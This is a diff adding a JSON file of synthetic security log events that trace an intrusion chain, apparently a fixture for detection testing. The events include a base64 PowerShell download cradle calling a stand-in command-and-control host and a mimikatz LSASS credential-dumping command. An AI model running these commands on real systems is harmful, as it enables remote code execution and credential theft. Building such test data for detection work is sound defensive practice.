@@ -1,0 +1,91 @@
+[
+  {
+    "event_id": "apt-001",
+    "timestamp": "2026-10-06T03:00:10Z",
+    "event_type": "AUTH_LOGIN",
+    "source": "Windows-Security-4624",
+    "actor_user": "svc_vpn",
+    "source_ip": "185.220.101.5",
+    "source_host": "EXTERNAL-TOR-NODE",
+    "dest_host": "VPN-GATEWAY-01",
+    "details": {
+      "Origin": "Known Tor Exit Relay (Netherlands / Russia)",
+      "LogonType": 3
+    },
+    "raw_log": "EventID 4624: VPN Gateway authentication for svc_vpn from 185.220.101.5 (Known Tor Exit)"
+  },
+  {
+    "event_id": "apt-002",
+    "timestamp": "2026-10-06T03:04:15Z",
+    "event_type": "PROCESS_SPAWN",
+    "source": "Sysmon-Event-1",
+    "actor_user": "svc_vpn",
+    "source_host": "WKS-DEV-09",
+    "process_name": "powershell.exe",
+    "process_command": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AYQBkAHYAZQByAHMAYQByAHkALgB4AHkAegAvAHMAdABhAGcAZQAnACkA",
+    "parent_process": "wmiprvse.exe",
+    "details": {
+      "Technique": "T1059.001 - In-memory web client cradle"
+    },
+    "raw_log": "Sysmon Event 1: powershell.exe invoked with base64 encoded downloadstring payload by svc_vpn"
+  },
+  {
+    "event_id": "apt-003",
+    "timestamp": "2026-10-06T03:12:40Z",
+    "event_type": "AUTH_LOGIN",
+    "source": "Windows-Security-4624",
+    "actor_user": "svc_vpn",
+    "source_ip": "10.0.1.19",
+    "source_host": "WKS-DEV-09",
+    "dest_host": "DC-CORP-01",
+    "details": {
+      "LogonType": 3,
+      "Protocol": "SMB/RPC Lateral Pivot"
+    },
+    "raw_log": "EventID 4624: Network logon to Domain Controller DC-CORP-01 from internal pivot host WKS-DEV-09"
+  },
+  {
+    "event_id": "apt-004",
+    "timestamp": "2026-10-06T03:15:20Z",
+    "event_type": "PROCESS_SPAWN",
+    "source": "Sysmon-Event-1",
+    "actor_user": "SYSTEM",
+    "source_host": "DC-CORP-01",
+    "process_name": "mimikatz.exe",
+    "process_command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+    "details": {
+      "Technique": "T1003.001 - LSASS Memory Dumping"
+    },
+    "raw_log": "Sysmon Event 1: Process mimikatz.exe executed privilege::debug sekurlsa::logonpasswords on DC-CORP-01"
+  },
+  {
+    "event_id": "apt-005",
+    "timestamp": "2026-10-06T03:22:10Z",
+    "event_type": "FILE_ACCESS",
+    "source": "Windows-Security-4663",
+    "actor_user": "SYSTEM",
+    "source_host": "DC-CORP-01",
+    "file_path": "C:\\Windows\\NTDS\\ntds.dit",
+    "process_name": "ntdsutil.exe",
+    "details": {
+      "Technique": "T1003.003 - Active Directory Database Staging"
+    },
+    "raw_log": "EventID 4663: Target file C:\\Windows\\NTDS\\ntds.dit accessed by ntdsutil.exe for IFM snapshot staging"
+  },
+  {
+    "event_id": "apt-006",
+    "timestamp": "2026-10-06T03:28:45Z",
+    "event_type": "NETWORK_CONNECT",
+    "source": "Zeek-Conn",
+    "actor_user": "svc_vpn",
+    "source_host": "DC-CORP-01",
+    "source_ip": "10.0.10.5",
+    "dest_ip": "91.108.4.19",
+    "details": {
+      "port": 4444,
+      "bytes_out": 248901240,
+      "Technique": "T1048 - Exfiltration Over Asymmetric Protocol"
+    },
+    "raw_log": "Zeek Conn: DC-CORP-01 (10.0.10.5) pushed 237MB raw payload to 91.108.4.19:4444"
+  }
+]
